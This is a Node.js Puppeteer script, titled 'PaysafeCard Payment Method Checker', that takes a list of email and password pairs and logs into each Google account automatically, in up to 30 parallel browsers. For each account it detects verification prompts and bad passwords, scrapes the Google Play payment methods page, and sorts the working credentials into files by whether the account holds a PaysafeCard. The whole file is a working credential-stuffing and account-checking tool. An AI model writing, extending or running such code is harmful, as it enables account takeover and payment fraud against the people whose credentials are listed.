require("dotenv").config();
const puppeteer = require("puppeteer");
const fs = require("fs");
const chalk = require("chalk");
const readline = require("readline");

const parseArgs = () => {
  const args = {};
  for (let i = 2; i < process.argv.length; i++) {
    const arg = process.argv[i];
    if (!arg.startsWith("--")) continue;

    const [rawKey, inlineValue] = arg.slice(2).split("=");
    const key = rawKey.replace(/-([a-z])/g, (_, letter) => letter.toUpperCase());
    const nextValue = process.argv[i + 1];

    if (inlineValue !== undefined) {
      args[key] = inlineValue;
    } else if (nextValue && !nextValue.startsWith("--")) {
      args[key] = nextValue;
      i++;
    } else {
      args[key] = true;
    }
  }
  return args;
};

const cliArgs = parseArgs();
const paths = {
  input: cliArgs.inputFile || process.env.CHECKER_INPUT_FILE || "check-gsuite.txt",
  success: cliArgs.successFile || process.env.CHECKER_SUCCESS_FILE || "hasil-checker.txt",
  verify: cliArgs.verifyFile || process.env.CHECKER_VERIFY_FILE || "verif-gsuite.txt",
  empty: cliArgs.emptyFile || process.env.CHECKER_EMPTY_FILE || "gsuite-kosong.txt",
};

const cliThreads = Number(cliArgs.threads || process.env.CHECKER_THREADS || 0);
const cliLimit = Number(cliArgs.limit || process.env.CHECKER_LIMIT || 0);
const isNonInteractive = Boolean(cliArgs.inputFile || cliArgs.threads || cliArgs.limit || process.env.CHECKER_NON_INTERACTIVE);

// Create readline interface
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

// Helper function to ask questions
const question = (query) =>
  new Promise((resolve) => rl.question(query, resolve));

// Enhanced logging system
const log = (type, message) => {
  const timestamp = new Date().toLocaleTimeString("en-US", { hour12: false });
  const logTypes = {
    info: chalk.blue("INFO"),
    success: chalk.green("SUCCESS"),
    error: chalk.red("ERROR"),
    warn: chalk.yellow("WARNING"),
    verify: chalk.magenta("VERIFY"),
  };
  const logType = logTypes[type] || chalk.magenta(type.toUpperCase());
  console.log(`[${timestamp}] ${logType} ${message}`);
};

const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// File operation queue to prevent race conditions
class FileOperationQueue {
  constructor() {
    this.queue = [];
    this.processing = false;
  }

  async add(operation) {
    return new Promise((resolve, reject) => {
      this.queue.push({ operation, resolve, reject });
      this.process();
    });
  }

  async process() {
    if (this.processing || this.queue.length === 0) return;
    
    this.processing = true;
    const { operation, resolve, reject } = this.queue.shift();
    
    try {
      const result = await operation();
      resolve(result);
    } catch (error) {
      reject(error);
    } finally {
      this.processing = false;
      if (this.queue.length > 0) {
        this.process();
      }
    }
  }
}

// Create global queue instances
const fileQueues = {
  checkGsuite: new FileOperationQueue(),
  hasilChecker: new FileOperationQueue(),
  verifGsuite: new FileOperationQueue(),
  gsuiteKosong: new FileOperationQueue(),
};

// Helper function to check if email already exists in hasil-checker.txt
const isEmailAlreadySaved = (email) => {
  try {
    if (!fs.existsSync(paths.success)) {
      return false;
    }
    
    const content = fs.readFileSync(paths.success, "utf-8");
    const existingEmails = content
      .split("\n")
      .filter((line) => line.trim() !== "")
      .map((line) => line.split("|")[0].trim().toLowerCase());
    
    return existingEmails.includes(email.toLowerCase());
  } catch (error) {
    log("error", `Error checking existing emails: ${error.message}`);
    return false;
  }
};

// Thread-safe file append function
const appendToFile = async (filePath, content) => {
  const queueKey = filePath.replace(/[^a-zA-Z]/g, '');
  const queue = fileQueues[queueKey] || new FileOperationQueue();
  
  return queue.add(async () => {
    try {
      await fs.promises.appendFile(filePath, content);
      return true;
    } catch (error) {
      log("error", `Failed to append to ${filePath}: ${error.message}`);
      return false;
    }
  });
};

// Thread-safe file removal function
const removeLineFromFile = async (filePath, lineToRemove) => {
  return fileQueues.checkGsuite.add(async () => {
    try {
      const content = await fs.promises.readFile(filePath, "utf-8");
      const lines = content.split("\n").filter((line) => line.trim() !== "");
      const newLines = lines.filter(
        (line) => line.trim() !== lineToRemove.trim()
      );

      if (lines.length !== newLines.length) {
        const newContent =
          newLines.join("\n") + (newLines.length > 0 ? "\n" : "");
        await fs.promises.writeFile(filePath, newContent);
        log("info", `Removed ${lineToRemove.split("|")[0]} from ${filePath}`);
        return true;
      }
      return false;
    } catch (error) {
      log("error", `Failed to update ${filePath}: ${error.message}`);
      return false;
    }
  });
};

// Batch removal function for better performance
const removeLinesFromFile = async (filePath, linesToRemove) => {
  return fileQueues.checkGsuite.add(async () => {
    try {
      const content = await fs.promises.readFile(filePath, "utf-8");
      const lines = content.split("\n").filter((line) => line.trim() !== "");
      
      const removeSet = new Set(linesToRemove.map(line => line.trim()));
      const newLines = lines.filter(line => !removeSet.has(line.trim()));

      const removedCount = lines.length - newLines.length;
      if (removedCount > 0) {
        const newContent = newLines.join("\n") + (newLines.length > 0 ? "\n" : "");
        await fs.promises.writeFile(filePath, newContent);
        log("info", `Removed ${removedCount} lines from ${filePath}`);
        return true;
      }
      return false;
    } catch (error) {
      log("error", `Failed to batch update ${filePath}: ${error.message}`);
      return false;
    }
  });
};

const googleIntegration = {
  login: async (page, email, password) => {
    try {
      await page.goto("https://accounts.google.com/signin", {
        waitUntil: "networkidle2",
        timeout: 30000
      });
      
      // Wait for email input to be visible
      await page.waitForSelector('input[type="email"]', { visible: true, timeout: 10000 });
      await page.type('input[type="email"]', email);
      await page.click("#identifierNext");
      
      // Wait for password input
      await page.waitForSelector('input[type="password"]', { visible: true, timeout: 10000 });
      await page.type('input[type="password"]', password);
      await page.click("#passwordNext");

      // Wait a bit to check for phone verification
      await delay(5000);

      // Check for phone verification requirement with better error handling
      const needsVerification = await page.evaluate(() => {
        try {
          // Check if body exists
          if (!document.body) {
            return false;
          }
          
          const bodyText = document.body.innerText?.toLowerCase() || '';
          const verifyTexts = [
            'verify it\'s you',
            'verify phone',
            'phone number',
            'verify your phone',
            'verifikasi nomor',
            'nomor telepon',
            'verify your identity',
            'prove you\'re not a robot',
            '2-step verification',
            'verify your account',
            'confirm your recovery',
            'get a verification code'
          ];
          
          return verifyTexts.some(text => bodyText.includes(text));
        } catch (error) {
          console.error('Error checking verification:', error);
          return false;
        }
      });

      if (needsVerification) {
        log("verify", `Phone verification required for ${email}`);
        return { 
          success: false, 
          needsVerification: true,
          error: "Phone verification required" 
        };
      }

      // Check for wrong password or account issues
      const hasError = await page.evaluate(() => {
        try {
          if (!document.body) return false;
          const bodyText = document.body.innerText?.toLowerCase() || '';
          return bodyText.includes('wrong password') || 
                 bodyText.includes('couldn\'t find your google account') ||
                 bodyText.includes('kata sandi salah') ||
                 bodyText.includes('akun tidak ditemukan');
        } catch (error) {
          return false;
        }
      });

      if (hasError) {
        log("error", `Invalid credentials for ${email}`);
        return {
          success: false,
          error: "Invalid email or password"
        };
      }

      try {
        await page.waitForSelector(
          'input[type="submit"][value="Saya mengerti"]',
          { timeout: 5000 }
        );
        await page.click('input[type="submit"][value="Saya mengerti"]');
        await delay(2000);
      } catch (error) {
        // Ignore if "Saya mengerti" button is not found
      }

      await delay(3000);
      log("info", `Google Sign In | ${email}`);

      await page.goto("https://play.google.com/store/paymentmethods", {
        waitUntil: "networkidle2",
        timeout: 30000
      });
      
      await page.waitForSelector("c-wiz.nI07g ul", { timeout: 15000 });

      const existingPaymentMethods = await page.evaluate(() => {
        const methods = [];
        const elements = document.querySelectorAll("c-wiz.nI07g ul > li");
        elements.forEach((el) => {
          const text = el.textContent.trim();
          if (text && !text.includes("Add") && !text.includes("Redeem code")) {
            methods.push(text);
          }
        });
        return methods;
      });

      if (existingPaymentMethods.length > 0) {
        log(
          "info",
          `Payment methods found for ${email}: ${existingPaymentMethods.join(
            ", "
          )}`
        );
        return {
          success: true,
          existingMethods: existingPaymentMethods,
          hasPaysafeCard: existingPaymentMethods.some((method) =>
            method.includes("PaysafeCard:")
          ),
        };
      }

      return { success: true, existingMethods: [] };
    } catch (error) {
      log("error", `Google Sign In Failed: ${email} - ${error.message}`);
      return { success: false, error: error.message };
    }
  },
};

const checkPaymentMethod = async (credential) => {
  const [email, password] = credential.split("|");
  const browser = await puppeteer.launch({
    headless: "new",
    defaultViewport: null,
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-dev-shm-usage'
    ]
  });
  const page = await browser.newPage();

  try {
    const loginResult = await googleIntegration.login(
      page,
      email.trim(),
      password.trim()
    );

    // Handle phone verification requirement
    if (loginResult.needsVerification) {
      await appendToFile(paths.verify, `${email}|${password}\n`);
      log("verify", `${email} - Needs phone verification, saved to ${paths.verify}`);
      return { 
        email, 
        credential,
        needsVerification: true,
        hasPaysafeCard: false 
      };
    }

    if (!loginResult.success) {
      log("error", `${email} - Login failed: ${loginResult.error}`);
      return { email, credential, error: loginResult.error };
    }

    if (loginResult.hasPaysafeCard) {
      // Check if email already exists in hasil-checker.txt
      if (isEmailAlreadySaved(email.trim())) {
        log("warn", `${email} - Already exists in ${paths.success}, skipping save`);
      } else {
        await appendToFile(paths.success, `${email}|${password}\n`);
        log("success", `${email} - Has PaysafeCard payment method, saved to ${paths.success}`);
      }
    } else if (loginResult.existingMethods.length === 0) {
      await appendToFile(paths.empty, `${email}|${password}\n`);
      log("info", `${email} - No payment methods found`);
    }

    return { 
      email,
      credential,
      hasPaysafeCard: loginResult.hasPaysafeCard, 
      isDuplicate: loginResult.hasPaysafeCard && isEmailAlreadySaved(email.trim()),
      needsVerification: false
    };
  } catch (error) {
    log("error", `Error checking ${email}: ${error.message}`);
    return { email, credential, error: error.message };
  } finally {
    await browser.close();
  }
};

// Function to process accounts in batches
const processBatch = async (credentials, startIndex, batchSize) => {
  const batch = credentials.slice(startIndex, startIndex + batchSize);
  const results = await Promise.all(batch.map((credential) => checkPaymentMethod(credential)));
  
  // Only remove successfully processed credentials (not errors due to network/timeout)
  const credentialsToRemove = results
    .filter(r => {
      // Remove if: successful login OR needs verification OR invalid credentials
      // DON'T remove if: network error, timeout, or other processing errors
      if (!r.error) return true; // Success or needs verification
      
      // Remove if invalid credentials (won't work on retry)
      if (r.error.includes("Invalid email or password")) return true;
      if (r.error.includes("couldn't find")) return true;
      
      // Keep if network/timeout error (can retry later)
      return false;
    })
    .map(r => r.credential);
  
  await removeLinesFromFile(paths.input, credentialsToRemove);
  
  return results;
};

const main = async () => {
  console.clear();
  console.log(chalk.blue("\n=== PaysafeCard Payment Method Checker ===\n"));

  try {
    // Read credentials from configured checker input
    const allCredentials = fs
      .readFileSync(paths.input, "utf-8")
      .split("\n")
      .filter((line) => line.trim() !== "");

    console.log(`Total accounts available: ${allCredentials.length}`);

    let threadCount;
    if (isNonInteractive) {
      threadCount = Math.min(30, Math.max(1, cliThreads || 1));
    } else {
      while (true) {
        threadCount = parseInt(await question("Enter number of threads (1-30): "));
        if (!isNaN(threadCount) && threadCount >= 1 && threadCount <= 30) {
          break;
        }
        console.log(chalk.red("Please enter a valid number between 1 and 30"));
      }
    }

    let accountsToProcess;
    if (isNonInteractive) {
      accountsToProcess = Math.min(allCredentials.length, Math.max(1, cliLimit || allCredentials.length));
    } else {
      while (true) {
        accountsToProcess = parseInt(
          await question(
            `Enter number of accounts to process (1-${allCredentials.length}): `
          )
        );
        if (
          !isNaN(accountsToProcess) &&
          accountsToProcess >= 1 &&
          accountsToProcess <= allCredentials.length
        ) {
          break;
        }
        console.log(
          chalk.red(
            `Please enter a valid number between 1 and ${allCredentials.length}`
          )
        );
      }
    }

    // Get the specified number of credentials
    const credentials = allCredentials.slice(0, accountsToProcess);

    log(
      "info",
      `Will process ${credentials.length} accounts using ${threadCount} threads`
    );
    await delay(2000);

    let successCount = 0;
    let failCount = 0;
    let paysafeCardCount = 0;
    let duplicateCount = 0;
    let verificationCount = 0;
    const BATCH_SIZE = threadCount;

    // Process accounts in batches
    for (let i = 0; i < credentials.length; i += BATCH_SIZE) {
      log(
        "info",
        `Processing batch ${Math.floor(i / BATCH_SIZE) + 1} of ${Math.ceil(
          credentials.length / BATCH_SIZE
        )}`
      );

      const results = await processBatch(credentials, i, BATCH_SIZE);

      results.forEach((result) => {
        if (result.error) {
          failCount++;
        } else if (result.needsVerification) {
          verificationCount++;
        } else {
          successCount++;
          if (result.hasPaysafeCard) {
            paysafeCardCount++;
            if (result.isDuplicate) {
              duplicateCount++;
            }
          }
        }
      });

      // Add delay between batches to avoid rate limiting
      if (i + BATCH_SIZE < credentials.length) {
        await delay(5000);
      }
    }

    console.log("\n" + chalk.cyan("=".repeat(50)));
    console.log(chalk.bold.white("Check Summary:"));
    console.log(chalk.cyan("=".repeat(50)));
    console.log(`Total Accounts Checked: ${successCount + failCount + verificationCount}`);
    console.log(chalk.green(`✓ Successful Checks: ${successCount}`));
    console.log(chalk.red(`✗ Failed Checks: ${failCount}`));
    console.log(chalk.blue(`★ Accounts with PaysafeCard: ${paysafeCardCount}`));
    console.log(chalk.yellow(`⊘ Duplicate accounts skipped: ${duplicateCount}`));
    console.log(chalk.magenta(`⚠ Accounts need verification: ${verificationCount}`));
    console.log(chalk.cyan("=".repeat(50)));
    console.log(
      "\n" + chalk.green("New accounts with PaysafeCard saved to:") + ` ${paths.success}`
    );
    console.log(
      chalk.magenta("Accounts needing verification saved to:") + ` ${paths.verify}`
    );
    console.log(
      chalk.blue("Processed accounts removed from:") + ` ${paths.input}`
    );
  } catch (error) {
    log("error", `Main process error: ${error.message}`);
  } finally {
    rl.close();
  }
};

main().catch((err) => {
  log("error", `Fatal error: ${err.message}`);
  process.exit(1);
});
